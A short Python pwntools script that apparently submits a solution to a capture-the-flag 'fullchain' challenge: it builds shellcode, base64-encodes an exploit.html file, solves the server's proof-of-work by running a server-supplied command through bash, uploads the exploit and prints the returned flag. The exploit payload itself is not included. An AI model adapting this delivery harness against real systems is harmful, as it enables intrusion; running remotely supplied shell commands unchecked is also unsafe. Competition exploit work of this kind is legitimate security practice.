from pwn import *
import base64
import os

os.system("make -C shellcode")
os.system("python3 sc.py")
data = base64.b64encode(open("exploit.html","rb").read())

#r = process("python3 run_qemu.py".split())

r = remote("fullchain.2021.ctfcompetition.com", 1337)
r.recvuntil(b"with:")
r.recvline()
cmd = r.recvline()
print(cmd)
s = process(["bash","-c",cmd])
s.recvline()
ans = s.recvline()
print(ans)
r.sendafter("?",ans)
r.sendlineafter("?",str(len(data)))
r.sendafter("!",data)
r.recvuntil(b"CTF{")
flag = b"CTF{"+ r.recvline()
print(flag)
r.close()
